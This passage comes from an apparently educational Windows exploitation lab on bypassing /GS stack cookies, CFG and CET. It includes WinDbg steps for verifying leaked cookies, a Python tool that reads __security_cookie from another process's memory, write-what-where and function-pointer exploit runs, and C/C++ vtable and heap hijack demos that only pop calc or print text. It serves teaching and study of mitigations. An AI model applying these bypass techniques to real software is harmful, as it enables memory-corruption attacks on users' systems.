5. **Verify with WinDbg** — cross-check leaked values against actual stack:

   ```bash
   # Launch server under debugger
   windbg C:\Windows_Mitigations_Lab\bin\realworld_server.exe

   # Set breakpoint at the vulnerable function
   bp realworld_server!handle_login
   g
   # Server starts — connect with the format string payload from another terminal

   # When breakpoint hits, examine the stack:
   dqs rsp L30
   # Look for the cookie value (high-entropy, XOR'd with RSP)

   # Calculate expected cookie: global cookie XOR'd with RSP
   # IMPORTANT: poi() dereferences the symbol — without it, you get the ADDRESS
   ? poi(realworld_server!__security_cookie) ^ rsp
   # Result should match one of the leaked values

   # Find where code pointers appear on the stack:
   # Return addresses will be in the 0x00007FF6XXXXXXXX range (server module)
   # or 0x00007FFXXXXXXXXX range (system DLLs like ucrtbase, kernel32)
   dqs rsp L80
   # Match against the values your exploit reported
   ```

6. **Understand what was recovered**:

   | Item         | Example              | Exploit Use                                      |
   | ------------ | -------------------- | ------------------------------------------------ |
   | Stack cookie | `0x8101010101010100` | Place in overflow to pass `/GS` check (non-CET)  |
   | DLL code ptr | `0x00007FF939C0F77C` | Calculate DLL base -> find API addresses for ROP |
   | Server base  | Printed at startup   | Server module base for struct-based attacks      |

7. **On non-CET systems**: Build a ROP chain using the leaked cookie and code pointers
8. **On CET systems**: The cookie leak is still valuable for understanding the target, but use struct-based attacks (Techniques 1-4) for exploitation — CET shadow stack blocks ROP

#### Task 2: CFG Coarse-Grained Bypass — Prove It Empirically

Use the Technique 3 `--cfg-test` mode to observe CFG behavior directly.

1. **Compile all three variants** (no mitigation, /GS only, /GS + CFG):

   ```bash
   cd C:\Windows_Mitigations_Lab

   # Baseline: no /GS, no CFG
   cl /GS- /Zi /D_CRT_SECURE_NO_WARNINGS src\func_ptr_overwrite.c ^
      /Fe:bin\func_ptr_overwrite.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

   # /GS only: prove struct members not reordered
   cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\func_ptr_overwrite.c ^
      /Fe:bin\func_ptr_overwrite_gs.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

   # /GS + CFG: observe coarse-grained check
   cl /GS /Zi /guard:cf /D_CRT_SECURE_NO_WARNINGS src\func_ptr_overwrite.c ^
      /Fe:bin\func_ptr_overwrite_cfg.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /guard:cf /DEBUG
   ```

2. **Run all three standard exploits** — all should pop calc:

   ```bash
   python exploits\sc_3_funcptr.py --exploit
   # All three builds: [DANGER] Executing: calc.exe
   # /GS doesn't help (struct members preserved)
   # CFG doesn't help (dangerous_handler is a valid function entry)
   ```

3. **Run the CFG coarse-grained test**:

   ```bash
   python exploits\sc_3_funcptr.py --cfg-test
   # TEST 1: Redirect to dangerous_handler (valid entry) -> CFG ALLOWS -> calc pops
   # TEST 2: Redirect to dangerous_handler+4 (mid-function)  -> CFG BLOCKS -> 0x80000003
   ```

4. **Analyze CFG validation in WinDbg**:

   ```bash
   # Launch CFG build under debugger

   # Break at the indirect call site (where handler is called)
   # First, find the call instruction in process_request:
   uf func_ptr_overwrite_cfg!process_request
   # Look for: call qword ptr [__guard_check_icall_fptr]
   #           call rax   (or similar indirect call pattern)

   # Set breakpoint at the CFG check:
   bp func_ptr_overwrite_cfg!process_request
   g
   # Feed the exploit payload from another terminal

   # Single-step through the CFG check:
   # The guard check validates RAX against the CFG bitmap.
   # If RAX = dangerous_handler (valid entry) -> check passes
   # If RAX = dangerous_handler+4 (mid-function) -> __fastfail

   # Watch the bitmap lookup:
   bp ntdll!LdrpValidateUserCallTarget
   g
   # When hit, examine:
   r rcx    # Target address being validated
   # Step through to see the bitmap check
   ```

5. **Verify CET independence**: All struct-based attacks succeed with CET enabled.
   CET protects `RET` instructions (backward edge), not indirect `CALL` (forward edge).
   The struct function pointer overwrite uses `CALL`, so CET is irrelevant.

#### Task 3: Cookie Analysis Tool

A functional tool that reads `__security_cookie` from a running process by
parsing the PE export directory and `.data` section. Requires the target
process to be compiled with debug symbols or the cookie offset found via
`dumpbin`.

```python
# cookie_analyzer.py
# Reads __security_cookie from a target Windows process.
#
# Usage:
#   python cookie_analyzer.py <pid> <cookie_rva>
#
# Find cookie_rva with:
#   dumpbin /symbols bin\realworld_server.exe | findstr __security_cookie
#   # Example: 00000000000A4560  __security_cookie
#   # RVA = 0xA4560
#
# Or in WinDbg:
#   x realworld_server!__security_cookie
#   # Subtract module base to get RVA

import ctypes
from ctypes import wintypes
import struct
import sys

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
psapi = ctypes.WinDLL('psapi', use_last_error=True)

# Process access rights
PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400


def read_process_memory(handle, address, size):
    """Read 'size' bytes from 'address' in the target process."""
    buffer = ctypes.create_string_buffer(size)
    bytes_read = ctypes.c_size_t()
    ok = kernel32.ReadProcessMemory(
        handle,
        ctypes.c_void_p(address),
        buffer,
        size,
        ctypes.byref(bytes_read)
    )
    if not ok:
        err = ctypes.get_last_error()
        print(f"  [!] ReadProcessMemory failed at 0x{address:016X}: error {err}")
        return b""
    return buffer.raw[:bytes_read.value]


def get_module_base(handle):
    """
    Get the base address of the main module (the EXE) in the target process.
    Uses EnumProcessModulesEx — the first module is always the EXE itself.
    """
    hMods = (ctypes.c_void_p * 1024)()
    cbNeeded = wintypes.DWORD()
    ok = psapi.EnumProcessModulesEx(
        handle,
        ctypes.byref(hMods),
        ctypes.sizeof(hMods),
        ctypes.byref(cbNeeded),
        0x03  # LIST_MODULES_ALL
    )
    if not ok:
        print(f"  [!] EnumProcessModulesEx failed: {ctypes.get_last_error()}")
        return None

    # First module = main EXE
    base = hMods[0]
    if base is None or base == 0:
        return None

    # hMods[0] returns a Python int from c_void_p — use it directly for math,
    # but wrap in ctypes.c_void_p() when passing to API calls (large x64
    # addresses like 0x7FF6XXXXXXXX overflow if passed as plain int)
    mod_name = ctypes.create_string_buffer(260)
    psapi.GetModuleBaseNameA(handle, ctypes.c_void_p(base), mod_name, 260)

    print(f"  [*] Main module: {mod_name.value.decode()} @ 0x{base:016X}")
    return base


def analyze_cookie(pid, cookie_rva):
    """
    Read __security_cookie from a target process.

    The global __security_cookie is stored at a fixed RVA in the PE.
    It's initialized at process startup from entropy sources:
      - GetSystemTimeAsFileTime
      - GetCurrentProcessId / GetCurrentThreadId
      - QueryPerformanceCounter
      - Stack address

    On the stack, the cookie is XOR'd with RBP (x86) or RSP (x64)
    before being stored. The epilogue XORs again and compares with
    the global value. If they don't match -> __fastfail(2).
    """
    handle = kernel32.OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        False,
        pid
    )
    if not handle:
        print(f"[!] Failed to open PID {pid}: error {ctypes.get_last_error()}")
        print("    Ensure you have debug privileges (run as Administrator).")
        return

    print(f"[*] Opened PID {pid}")

    # Step 1: Find main module base address
    base = get_module_base(handle)
    if base is None:
        print("[!] Could not determine module base")
        kernel32.CloseHandle(handle)
        return

    # Step 2: Read __security_cookie at base + RVA
    cookie_addr = base + cookie_rva
    print(f"  [*] __security_cookie @ 0x{cookie_addr:016X} (base + 0x{cookie_rva:X})")

    data = read_process_memory(handle, cookie_addr, 8)
    if len(data) < 8:
        print("[!] Failed to read cookie value")
        kernel32.CloseHandle(handle)
        return

    cookie = struct.unpack('<Q', data)[0]
    print(f"  [+] __security_cookie = 0x{cookie:016X}")

    # Step 3: Analyze cookie properties
    print(f"\n[*] Cookie Analysis:")
    print(f"  Entropy bits: {bin(cookie).count('1')} of 64 set")

    # Check for weak/default cookies (should never appear in release)
    WEAK_COOKIES = [
        0x00002B992DDFA232,  # Default x64 cookie (uninitialized)
        0x0000BB40E64E6917,  # Another known default
        0x00000000BB40E64E,  # 32-bit default
    ]
    if cookie in WEAK_COOKIES:
        print(f"  [!] WARNING: Default/weak cookie detected!")
        print(f"      This means __security_init_cookie() may not have run.")
    else:
        print(f"  [*] Cookie appears properly randomized")

    # Check high 16 bits (should be non-zero for good entropy)
    if (cookie >> 48) == 0:
        print(f"  [!] WARNING: Upper 16 bits are zero — reduced entropy")
        print(f"      Expected full 64-bit entropy on x64 Windows 8+")
    else:
        print(f"  [*] Full 64-bit entropy present")

    # Step 4: Read .data section to find other interesting values nearby
    # The cookie is typically near the start of .data
    print(f"\n[*] Memory around cookie (±32 bytes):")
    context_data = read_process_memory(handle, cookie_addr - 32, 72)
    if context_data:
        for i in range(0, len(context_data), 8):
            offset = i - 32
            val = struct.unpack('<Q', context_data[i:i+8])[0]
            marker = " <-- __security_cookie" if offset == 0 else ""
            print(f"  [{offset:+4d}] 0x{val:016X}{marker}")

    kernel32.CloseHandle(handle)
    print(f"\n[*] Done. To see the stack-stored (XOR'd) cookie:")
    print(f"    Attach WinDbg -> bp on a /GS function -> examine [rsp+N]")
    print(f"    Stack cookie = global cookie XOR RSP (x64)")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python cookie_analyzer.py <pid> <cookie_rva_hex>")
        print("")
        print("Find cookie RVA:")
        print("  dumpbin /symbols bin\\target.exe | findstr __security_cookie")
        print("  # Take the hex address (e.g., 00000000000A4560 -> 0xA4560)")
        print("")
        print("Example:")
        print("  # Start target in one terminal:")
        print("  bin\\realworld_server.exe")
        print("  # Find PID:  tasklist | findstr realworld")
        print("  # Find RVA:  dumpbin /symbols bin\\realworld_server.exe | findstr __security_cookie")
        print("  python cookie_analyzer.py 1234 0xA4560")
        sys.exit(1)

    pid = int(sys.argv[1])
    cookie_rva = int(sys.argv[2], 16)
    analyze_cookie(pid, cookie_rva)
```

**Expected Output**:

```bash
c:\Windows_Mitigations_Lab> python cookie_analyzer.py 9968 0xA4560
#[*] Opened PID 9968
#  [*] Main module: realworld_server.exe @ 0x00007FF679980000
#  [*] __security_cookie @ 0x00007FF679A24560 (base + 0xA4560)
#  [+] __security_cookie = 0x00004336AA6DF55D
#
#[*] Cookie Analysis:
#  Entropy bits: 25 of 64 set
#  [*] Cookie appears properly randomized
#  [*] Full 64-bit entropy present
#
#[*] Memory around cookie (±32 bytes):
#  [ -32] 0x0000000000000000
#  [ -24] 0x0000000000000000
#  [ -16] 0x0000000000000001
#  [  -8] 0x00007FF679981000
#  [  +0] 0x00004336AA6DF55D <-- __security_cookie
#  [  +8] 0x0000000000000000
#  [ +16] 0x0000000000000000
#  [ +24] 0x0000000000000000
#  [ +32] 0x0000000000000000
#
#[*] Done. To see the stack-stored (XOR'd) cookie:
#    Attach WinDbg -> bp on a /GS function -> examine [rsp+N]
#    Stack cookie = global cookie XOR RSP (x64)
```

#### Task 4: Write-What-Where Lab — Global Function Pointer Attack

Demonstrate that `/GS` cookies are completely irrelevant when the vulnerability
is a Write-What-Where primitive (no stack corruption needed).

1. **Compile the www_vuln.c** (with `/GS` enabled — it won't help):

   ```bash
   cd C:\Windows_Mitigations_Lab
   cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\www_vuln.c ^
      /Fe:bin\www_vuln.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG
   ```

2. **Run the exploit** (addresses auto-parsed, no manual updates needed):

   ```bash
   python exploits\sc_www.py
   # Expected:
   #   [+] dangerous_action  = 0x0000000140001E33
   #   [+] cleanup_handler   @ 0x00000001400A4568 (address of global variable)
   #   [*] Payload (48 bytes):
   #   [*]   [36..39]  value: 0x40001E33 (low dword of dangerous_action)
   #   [*]   [40..47]  target: 0x00000001400A4568 (&cleanup_handler)
   #   [!] PWNED! Running dangerous action!
   #   [+] Clean exit (0x0) — cookie was never corrupted
   ```

3. **Verify cookie was untouched** — the exit code is `0x0` (clean), not `0xc0000409`.
   The `fread` reads exactly `sizeof(WriteRequest)` = 48 bytes into the struct.
   No bytes overflow past the struct into the stack cookie.

4. **Compare with stack-based attacks**: In Techniques 1-3, we corrupted function
   pointers that were struct members on the **stack**. Here, we use struct fields
   as **parameters** to an arbitrary write that targets a **global** function pointer.
   The stack cookie is simply never involved.

5. **Key insight**: `/GS` only detects corruption of the stack frame between the
   buffer and the return address. Writes to globals, heap, or other non-stack
   targets bypass `/GS` entirely. This is why defense-in-depth matters.

### Key Takeaways

1. **Stack cookies are bypassable through multiple vectors**: Information leaks (format string -> cookie recovery), struct-based function pointer overwrites (C standard §6.7.2.1 guarantees member order, `/GS` does NOT reorder struct internals), exception-based bypasses (cookie checked at `ret`, not at exception), and Write-What-Where primitives (target globals, never touch the cookie)
2. **`/GS` variable reordering has a critical blind spot**: While `/GS` moves arrays to higher stack addresses (next to the cookie), it cannot reorder **struct members** — the C standard requires preserved declaration order. Placing a buffer and function pointer in the same struct creates an exploitable layout that `/GS` cannot fix
3. **CET shadow stacks completely block return address hijacking**: Not "makes it harder" — **impossible**. The shadow stack is a hardware-protected copy of return addresses. Every `RET` compares both copies; mismatch -> `#CP` exception -> kernel kills the process via `__fastfail` -> exit code `0x80000003` (STATUS_BREAKPOINT). No user-mode recovery. This is why data-only and indirect `CALL` attacks are the modern approach
4. **CFG is coarse-grained — proven empirically**: MSVC CFG (`/guard:cf`) checks "is the target ANY valid function entry point?" — NOT "should THIS call site call THAT function." We proved this: redirecting `safe_handler` -> `dangerous_handler` passes CFG because `dangerous_handler` is a valid function. Only `dangerous_handler+4` (mid-function) is blocked with `0x80000003`. Fine-grained CFI (Clang `-fsanitize=cfi`) validates type signatures and would block this
5. **Data-only attacks bypass /GS + CET + coarse-grained CFG simultaneously**: Corrupting a security flag (`is_admin` in Technique 4), a function pointer in a struct (Techniques 1-3), or a global function pointer via Write-What-Where (Scenario 2) — none of these trigger any of the three mitigations
6. **Exception-based timing window**: `/GS` cookies are validated at function **return** (`__security_check_cookie` in the epilogue). If an exception fires between the overflow and the return, the `__except` handler reads already-corrupted data before the cookie is ever checked. On x64, this is NOT an SEH chain overwrite (impossible — table-based `.pdata`), but a data-corruption-before-check attack
7. **MSVCRT format strings differ from glibc in exploit-critical ways**:
   - `%p` prints bare hex (`000000000014FA48`) — no `0x` prefix
   - Positional `%N$x` is NOT supported — must use sequential `%p` and count offsets
   - `printf("%s", NULL)` prints `(null)` instead of crashing — cannot trigger exceptions this way
   - `_vsnprintf` buffer size limits how many values you can leak (512 bytes / 17 chars per `%p.` ≈ 30 values)
8. **ASLR interacts with all techniques**: With ASLR enabled (`/DYNAMICBASE`), leaked code pointers are 64KB-aligned-randomized. Partial overwrites (Technique 2) become harder because upper address bytes are randomized. Format string leaks are the primary ASLR defeat mechanism (leak -> calculate base -> build payload)
9. **Defense in depth is essential — no single mitigation is sufficient**:
   - `/GS` alone: bypassed by structs, exceptions, WWW, info leaks
   - CFG alone: bypassed by valid function redirects, data-only attacks
   - CET alone: bypassed by indirect CALL attacks, data-only attacks
   - ASLR alone: bypassed by info leaks (format strings, side channels)
   - All together: significantly raises the bar, but data-only attacks targeting application logic (not control flow) remain viable

### Discussion Questions

1. **Can you overflow past the stack cookie without corrupting it?**
   Yes — three proven methods from this lab:
   (a) Struct members: overflow within a struct corrupts the function pointer at a known offset but never reaches the cookie (Techniques 1-3).
   (b) Write-What-Where: use overflow to control struct fields that parameterize an arbitrary write to a global pointer (Scenario 2).
   (c) Exception window: corrupt data before the cookie is checked — the `__except` handler reads corrupted values mid-function (Technique 4).

2. **What happens if you leak the stack cookie value? Can CET still protect you?**
   Leaking the cookie lets you place the correct value in your overflow payload, surviving the `/GS` epilogue check. However, on CET-enabled systems, the return address is also validated against the shadow stack — the attacker cannot modify the shadow stack from user mode. So even with a leaked cookie, ROP/return address overwrites are blocked. The attacker must use data-only techniques (struct function pointers, global pointers, security flags) that don't involve `RET` hijacking.

3. **Why does CFG allow redirecting `safe_handler` -> `dangerous_handler`? What would block it?**
   CFG maintains a bitmap of valid function entry points. `dangerous_handler` IS a valid function entry, so CFG allows the call. CFG doesn't check "should this specific call site call this specific function" — it only checks "is the target a function entry at all." This is coarse-grained CFI. Fine-grained CFI (e.g., Clang's `-fsanitize=cfi`) would block this by verifying the function pointer's type signature matches the call site's expected signature. MSVC's XFG (eXtended Flow Guard) also adds type-based hashing but is not yet widely deployed.

4. **Why is SafeSEH only for 32-bit applications?**
   On x86, the SEH chain is stored on the stack — the attacker can overwrite exception handler pointers via buffer overflow. SafeSEH validates handlers against a table of known-good handlers. On x64, Windows uses table-based exception handling: `RUNTIME_FUNCTION` entries in the read-only `.pdata` PE section map instruction ranges to unwind info. The SEH chain doesn't exist on the stack, so there's nothing to overwrite. SafeSEH is unnecessary on x64 because the attack vector it protects against doesn't exist.

5. **If CET blocks return address overwrites, what attack classes remain viable?**
   Proven in this lab:
   - Struct-based function pointer corruption (indirect `CALL`, not `RET`) — Techniques 1-3
   - Data-only attacks (corrupt `is_admin`, config flags, file paths) — Technique 4
   - Write-What-Where to global function pointers — Scenario 2
   - JOP (Jump-Oriented Programming) — uses `JMP`, not `RET`
   - COP (Call-Oriented Programming) — uses `CALL`, not `RET`
   - Heap-based attacks (vtable overwrites via heap corruption) — not covered in depth here but CFG coarse-grained limitation applies

## Day 3: Control Flow Integrity (CFG, CET, XFG)

- **Goal**: Understand modern control-flow protection mechanisms.
- **Activities**:
  - _Reading_:
    - [Control Flow Guard](https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)
    - [Intel CET Documentation](https://www.intel.com/content/www/us/en/developer/articles/technical/technical-look-control-flow-enforcement-technology.html)
  - _Online Resources_:
    - [CFG Internals](https://blackhat.com/docs/us-15/materials/us-15-Zhang-Bypass-Control-Flow-Guard-Comprehensively-wp.pdf)
    - [CET Deep Dive](https://cdrdv2-public.intel.com/784473/784473_Intel%20Platform%20Security.pdf)
  - _Tool Setup_:
    - Windows 11 24H2 (for CET support)
    - Visual Studio 2022
    - WinDbg Preview
  - _Exercise_:
    - Enable CFG and test indirect call protection
    - Verify CET shadow stack
    - Observe XFG strict enforcement

### Control Flow Guard (CFG)

**What is CFG?**:

- Validates indirect call/jump targets
- Prevents control-flow hijacking
- Introduced in Windows 8.1/10
- Compiler + OS enforcement

**How CFG Works**:

```c
// Without CFG:
void (*func_ptr)() = user_controlled_value;
func_ptr();  // Jumps anywhere!

// With CFG:
void (*func_ptr)() = user_controlled_value;
// Compiler inserts:
if (!__guard_check_icall_fptr(func_ptr)) {
    __guard_icall_failure(func_ptr);  // Terminates
}
func_ptr();  // Only if valid target
```

### CFG Protection Scope: What It Blocks vs. What It Doesn't

> [!IMPORTANT]
> **CFG is forward-edge CFI only.** It validates indirect calls and jumps, but does NOT
> protect return addresses (backward-edge). ROP attacks using `ret` instructions are
> NOT blocked by CFG—that's what CET Shadow Stack is for.

**CFG Protection Matrix**:

| Attack Type                         | CFG Blocks? | Why / Why Not                                       |
| ----------------------------------- | ----------- | --------------------------------------------------- |
| **Indirect call to shellcode**      | Yes         | Shellcode address not in valid target bitmap        |
| **Indirect call to non-CFG DLL**    | Yes         | Non-CFG module functions not marked valid           |
| **vtable pointer overwrite**        | Yes\*       | \*Only if call site is CFG-instrumented             |
| **Function pointer overwrite**      | Yes\*       | \*Only if the call site uses `__guard_check_icall`  |
| **ROP chain (using `ret`)**         | No          | CFG doesn't validate return addresses               |
| **Direct call to attacker code**    | No          | Direct calls (`call 0x1234`) not validated          |
| **JOP (jump-oriented programming)** | Partial     | CFG validates `jmp [reg]` but not all gadget chains |
| **Data-only attacks**               | No          | CFG only protects control flow, not data            |
| **Calling valid but dangerous API** | No          | `VirtualProtect` is a valid CFG target              |
| **Type confusion (same signature)** | No          | CFG doesn't check function types (XFG does)         |

**Key Limitations to Understand**:

```text
CFG Limitation 1: Forward-Edge Only
-----------------------------------
CFG validates: call [rax], jmp [rax]
CFG ignores:   ret (return instructions)

ROP chains work because 'ret' pops address from stack and jumps.
CFG doesn't check these - the attacker controls the stack.

CFG Limitation 2: Call Site Must Be Instrumented
------------------------------------------------
CFG check only happens if:
1. Binary compiled with /guard:cf
2. Specific call site has guard check instrumentation

If the call site is in non-CFG code, NO validation occurs!

CFG Limitation 3: All Valid Functions Are Fair Game
---------------------------------------------------
If attacker overwrites function pointer to point to:
- VirtualProtect (valid target) -> Can make shellcode executable
- WinExec (valid target) -> Can execute arbitrary commands
- Any exported function -> These are all "valid"

This is why XFG (type checking) was developed.
```

**Lab: VTable Hijacking vs. CFG (C++)**

Week 5 touched on VTable smashing. This lab demonstrates the coarse-grained
nature of CFG: it blocks calls to shellcode or mid-function addresses, but
ALLOWS calls to valid function entries — even if the function was never
intended to be called from that call site.

Create `src\vtable_cfg_test.cpp`:

```cpp
// vtable_cfg_test.cpp
// Demonstrates CFG's coarse-grained behavior with vtable hijacking.
//
// Test 1: Redirect vtable to malicious_code (a valid function entry)
//         -> CFG ALLOWS this because malicious_code is in the CFG bitmap!
// Test 2: Redirect vtable to a shellcode address (not a valid function)
//         -> CFG BLOCKS this with __fastfail -> exit code 0x80000003
//
// This proves CFG only checks "is target a valid function entry?"
// — NOT "should this virtual call dispatch to that function?"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

class Shape {
public:
    virtual void draw() { printf("[*] Drawing Shape\n"); }
    virtual ~Shape() {}
};

class Circle : public Shape {
public:
    void draw() override { printf("[*] Drawing Circle\n"); }
};

void malicious_code() {
    printf("[!] PWNED: Malicious code executed!\n");
    printf("[!] This proves CFG is coarse-grained — malicious_code\n");
    printf("    is a valid function entry, so CFG allowed the call.\n");
    fflush(stdout);
}

int main(int argc, char **argv) {
    int test_mode = 1;  // Default: test 1 (valid function redirect)
    if (argc > 1) test_mode = atoi(argv[1]);

    Shape* shape = new Circle();
    printf("[*] Shape object at: %p\n", shape);
    printf("[*] Original VTable pointer: %p\n", *(void**)shape);
    fflush(stdout);

    if (test_mode == 1) {
        // TEST 1: Redirect to a valid function entry
        // CFG bitmap has malicious_code marked as valid -> call ALLOWED
        printf("\n[*] TEST 1: Redirect vtable to malicious_code (valid entry)\n");
        void* fake_vtable[] = { (void*)&malicious_code, NULL };
        printf("[*] Fake vtable at %p -> malicious_code at %p\n",
               fake_vtable, (void*)&malicious_code);
        *(void**)shape = fake_vtable;
        printf("[*] Calling shape->draw()...\n");
        fflush(stdout);
        shape->draw();  // CFG ALLOWS — malicious_code is a valid function!
        printf("[+] Call succeeded (CFG allowed it)\n");
    }
    else if (test_mode == 2) {
        // TEST 2: Redirect to arbitrary address (NOT a valid function)
        // 0xDEADDEAD is not in CFG bitmap -> call BLOCKED
        printf("\n[*] TEST 2: Redirect vtable to 0xDEADDEAD (invalid)\n");
        void* bad_vtable[] = { (void*)0xDEADDEAD, NULL };
        *(void**)shape = bad_vtable;
        printf("[*] Calling shape->draw()...\n");
        fflush(stdout);
        shape->draw();  // CFG BLOCKS — 0xDEADDEAD not in bitmap!
        printf("[-] Should not reach here\n");
    }

    delete shape;
    return 0;
}
```

**Compile & Run**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\vtable_cfg_test.cpp
cd C:\Windows_Mitigations_Lab

# 1. Without CFG — both tests "work" (no validation)
cl /EHsc /Zi src\vtable_cfg_test.cpp /Fe:bin\vtable_no_cfg.exe /link /DEBUG
.\bin\vtable_no_cfg.exe 1
# [!] PWNED: Malicious code executed!
.\bin\vtable_no_cfg.exe 2
# (Process crashes - Access violation at 0xDEADDEAD)

# 2. With CFG — Test 1 STILL works! Test 2 is blocked.
cl /EHsc /Zi /guard:cf src\vtable_cfg_test.cpp /Fe:bin\vtable_cfg.exe /link /guard:cf /DEBUG
.\bin\vtable_cfg.exe 1
# [!] PWNED: Malicious code executed!
# [!] This proves CFG is coarse-grained — malicious_code

.\bin\vtable_cfg.exe 2
# (Process killed by __fastfail - Exit code: 0x80000003 via int 0x29)
# CFG blocks it — 0xDEADDEAD is NOT in the CFG bitmap
```

> [!WARNING]
> **CFG does NOT prevent vtable-to-valid-function redirects!** `malicious_code` is a
> legitimate function entry point in the binary, so CFG allows the call. This is the
> same coarse-grained limitation proven in Day 2 Technique 3: CFG checks "is target
> ANY valid function?" — not "should THIS vtable dispatch THAT function."
> Only XFG (type-hash validation) or Clang's `-fsanitize=cfi` would block this.

**Verifying CFG Instrumentation at Call Sites**:

```bash
# Example with CFG-enabled binary (vtable_cfg.exe):
dumpbin /headers /loadconfig bin\vtable_cfg.exe | findstr -i "guard"
#    00000001400B8000 Guard CF address of check-function pointer
#    00000001400B8020 Guard CF address of dispatch-function pointer
#    00000001400B7000 Guard CF function table
#                  6D Guard CF function count        ← 109 functions protected
#            10014500 Guard Flags                    ← CF Instrumented (bit 0x10000000)
#    00000001400B8010 Guard XFG address of check-function pointer

# Example without CFG (vtable_no_cfg.exe):
dumpbin /headers /loadconfig bin\vtable_no_cfg.exe | findstr -i "guard"
#    00000001400A6000 Guard CF address of check-function pointer
#    00000001400A6020 Guard CF address of dispatch-function pointer
#    0000000000000000 Guard CF function table        ← No table (null)
#                   0 Guard CF function count        ← Zero functions protected
#            00000100 Guard Flags                    ← NOT instrumented (no 0x10000000)

# Key differences:
#   CFG Enabled:  Guard CF function count > 0, Guard Flags has 0x10000000 bit set
#   CFG Disabled: Guard CF function count = 0, Guard Flags = 0x100 (reserved bits only)
```

**Exercise: CFG Heap Function Pointer Overwrite — Coarse vs Fine Grained**:

```c
// cfg_heap_test.c
// Demonstrates the coarse-grained nature of CFG with heap function pointers.
//
// Test 1 (mode 1): Overwrite with malicious_code (valid function entry)
//   -> CFG ALLOWS because malicious_code is in the CFG bitmap
// Test 2 (mode 2): Overwrite with arbitrary address (not a function entry)
//   -> CFG BLOCKS with __fastfail -> exit code 0x80000003
//
// Lesson: CFG prevents shellcode/ROP via indirect calls, but does NOT
// prevent redirecting to valid-but-dangerous functions.

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

typedef void (*Callback)(void);

void legitimate_callback() {
    printf("[*] Legitimate callback called\n");
}

void malicious_code() {
    printf("[!] MALICIOUS CODE EXECUTED!\n");
    printf("[!] CFG allowed this — malicious_code is a valid function entry.\n");
    fflush(stdout);
}

int main(int argc, char **argv) {
    int mode = 1;  // 1 = valid function, 2 = invalid address
    if (argc > 1) mode = atoi(argv[1]);

    Callback* cb_table = (Callback*)HeapAlloc(GetProcessHeap(), 0, sizeof(Callback) * 4);
    cb_table[0] = legitimate_callback;
    cb_table[1] = legitimate_callback;
    cb_table[2] = legitimate_callback;

    printf("[*] Callback table at: %p\n", cb_table);
    printf("[*] Original cb_table[2]: %p (legitimate_callback)\n",
           (void*)cb_table[2]);
    fflush(stdout);

    if (mode == 1) {
        printf("[*] Mode 1: Overwriting cb_table[2] with malicious_code (valid entry)\n");
        cb_table[2] = malicious_code;
    } else {
        printf("[*] Mode 2: Overwriting cb_table[2] with 0xDEADDEAD (invalid)\n");
        cb_table[2] = (Callback)0xDEADDEAD;
    }

    printf("[*] cb_table[2] now: %p\n", (void*)cb_table[2]);
    printf("[*] Calling through corrupted pointer...\n");
    fflush(stdout);

    cb_table[2]();  // CFG check happens here

    printf("[*] Call returned.\n");
    HeapFree(GetProcessHeap(), 0, cb_table);
    return 0;
}
```

**Compile & Run**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\cfg_heap_test.c
cd C:\Windows_Mitigations_Lab

# Compile WITH CFG
cl /Zi /guard:cf src\cfg_heap_test.c /Fe:bin\cfg_heap_test.exe /link /guard:cf /DEBUG

# Test 1: Redirect to valid function -> CFG ALLOWS
.\bin\cfg_heap_test.exe 1
# [*] Callback table at: 0000017CCDFDE660
# [*] Original cb_table[2]: 00007FF656727AA0 (legitimate_callback)
# [*] Mode 1: Overwriting cb_table[2] with malicious_code (valid entry)
# [*] cb_table[2] now: 00007FF656725140
# [*] Calling through corrupted pointer...
# [!] MALICIOUS CODE EXECUTED!
# [!] CFG allowed this — malicious_code is a valid function entry.
# [*] Call returned.
# Exit code: 0x0

# Test 2: Redirect to invalid address -> CFG BLOCKS
.\bin\cfg_heap_test.exe 2
# [*] Callback table at: 00000290182719C0
# [*] Original cb_table[2]: 00007FF656727AA0 (legitimate_callback)
# [*] Mode 2: Overwriting cb_table[2] with 0xDEADDEAD (invalid)
# [*] cb_table[2] now: 00000000DEADDEAD
# [*] Calling through corrupted pointer...
# (Process terminated by __fastfail - Exit code: 0x80000003)

# Compile WITHOUT CFG for comparison
cl /Zi src\cfg_heap_test.c /Fe:bin\cfg_heap_test_nocfg.exe /link /DEBUG

.\bin\cfg_heap_test_nocfg.exe 1
# [*] Callback table at: 0000022F1BF8E580
# [*] Original cb_table[2]: 00007FF7847B3152 (legitimate_callback)
# [*] Mode 1: Overwriting cb_table[2] with malicious_code (valid entry)
# [*] cb_table[2] now: 00007FF7847B2464
# [*] Calling through corrupted pointer...
# [!] MALICIOUS CODE EXECUTED!
# [!] CFG allowed this — malicious_code is a valid function entry.
# [*] Call returned.

.\bin\cfg_heap_test_nocfg.exe 2
# [*] Callback table at: 000002AFCF2F0D60
# [*] Original cb_table[2]: 00007FF7847B3152 (legitimate_callback)
# [*] Mode 2: Overwriting cb_table[2] with 0xDEADDEAD (invalid)
# [*] cb_table[2] now: 00000000DEADDEAD
# [*] Calling through corrupted pointer...
# (Access violation crash - no CFG protection)
```

**CFG Bitmap**:

- Process Creation:
  - OS creates CFG bitmap for process
  - Each bit represents 16-byte aligned address
  - Bit set = valid indirect call target
  - Bit clear = invalid
- Runtime:
  - Before indirect call, check bitmap
  - If target bit is set -> allow
  - If target bit is clear -> terminate

**Valid CFG Targets**:

- Function entry points (address-taken)
- Exported functions
- Dispatch tables
- **Excluded**: Functions marked with `__declspec(guard(suppress))` are explicitly NOT valid targets.

**CFG Check Assembly** (x64):

```asm
; Before indirect call
mov rax, [function_pointer]
call [__guard_check_icall_fptr]  ; Validation
call rax                          ; Actual call (if valid)

; __guard_check_icall_fptr:
; - Checks if target is in CFG bitmap
